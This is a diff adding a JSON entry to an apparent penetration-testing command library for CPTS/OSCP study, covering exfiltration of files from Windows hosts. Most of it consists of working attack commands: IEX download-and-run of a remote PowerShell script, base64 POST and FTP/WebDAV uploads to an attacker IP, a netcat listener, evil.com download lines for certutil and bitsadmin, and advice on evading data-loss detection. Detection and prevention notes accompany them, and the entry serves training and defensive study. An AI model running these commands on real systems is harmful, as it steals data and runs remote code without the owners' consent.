@@ -1,0 +1,131 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "powershell",
+    "uploadserver"
+  ],
+  "tags": [
+    "windows",
+    "upload",
+    "base64"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Windows Transfer",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "CPTS Ch07 — PSUpload IEX then invoke",
+      "command": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nInvoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts"
+    },
+    {
+      "label": "Base64 POST caught by nc",
+      "command": "$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nInvoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64"
+    }
+  ],
+  "notes": "Exfil from Windows: PowerShell `Invoke-WebRequest -Method PUT`/`-InFile`, base64 via clipboard, or an SMB/HTTP upload server. certutil-base64 for tiny files. Keep it encrypted where possible. PSUpload.ps1 wraps multipart form upload. Base64+POST catches without any server tool — just nc. WebDAV upload requires wsgidav running on attacker (sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous). Also covered in: CPTS Ch07 (File Transfers).",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "nginx-upload-catch",
+      "rel": "prereq",
+      "note": "Stand up a PUT-enabled receiver."
+    },
+    {
+      "id": "win-smb-transfer",
+      "rel": "alternative",
+      "note": "Drop onto your SMB share."
+    }
+  ],
+  "id": "win-upload",
+  "name": "Windows - Upload to Attacker",
+  "command": "Invoke-FileUpload -Uri http://<ip>:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "description": "Exfil files from Windows: use the PSUpload helper against a Python uploadserver, or base64-encode a file and POST it to a listener.",
+  "steps": [
+    {
+      "label": "1. Start uploadserver (attacker)",
+      "command": "pip3 install uploadserver\npython3 -m uploadserver"
+    },
+    {
+      "label": "2a. PSUpload helper (target)",
+      "command": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nInvoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts"
+    },
+    {
+      "label": "2b. Base64 POST (target)",
+      "command": "$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nInvoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n# attacker: nc -lvnp 8000  then  echo <base64> | base64 -d > hosts"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1048.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Uploading data OFF a Windows target (PowerShell POST, SMB copy to attacker share, etc.) exfiltrates loot such as credential material or NTDS.dit over a non-C2 channel.",
+    "prerequisites": "Code execution on the target, sensitive data to exfil, and an attacker-controlled endpoint reachable over an allowed protocol.",
+    "impact": "Sensitive data (creds, config, NTDS.dit) leaves the environment - a confidentiality breach and a foothold for offline cracking.",
+    "detection": "Outbound data flows to an external/unknown host - especially large or unusual for the source process - are the tell; DLP and egress monitoring flag uploads of sensitive file types; command line and UA as for downloads.",
+    "artifacts": "An outbound POST/copy to the attacker; the source process making an unusual network connection; DLP hits on exfiltrated content.",
+    "prevention": "[MITRE T1048 M1037 Filter Network Traffic] Egress filtering and DLP to detect/block exfil; [M1057 Data Loss Prevention] on sensitive file types; restrict which hosts can reach the internet.",
+    "evasion": "Encrypt/compress and chunk the data to defeat DLP signatures; exfil over an allowed protocol (HTTPS/SMB) and blend with normal egress volume.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1048.003"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  },
+  "variations": [
+    {
+      "description": "Upload via PSUpload.ps1 (load remotely then invoke)",
+      "command": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nInvoke-FileUpload -Uri http://<ip>:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "label": "IEX(New-Object"
+    },
+    {
+      "description": "Base64-encode file and POST to listener (no tool needed)",
+      "command": "$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nInvoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64",
+      "label": "$b64 = [System.convert]::ToBase64S…"
+    },
+    {
+      "description": "Catch base64 POST with netcat and decode (attacker/Linux)",
+      "command": "nc -lvnp 8000\n# then: echo <base64> | base64 -d -w 0 > hosts",
+      "label": "nc listener"
+    },
+    {
+      "description": "Upload via FTP (pyftpdlib with --write on attacker)",
+      "command": "(New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')",
+      "label": "(New-Object"
+    },
+    {
+      "description": "FTP upload via script file (no interactive FTP session)",
+      "command": "echo open <ip> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt",
+      "label": "echo open > ftpcommand.txt"
+    },
+    {
+      "description": "Upload via WebDAV share (wsgidav on attacker)",
+      "command": "copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\<ip>\\DavWWWRoot\\",
+      "label": "WebDAV copy"
+    }
+  ]
+}
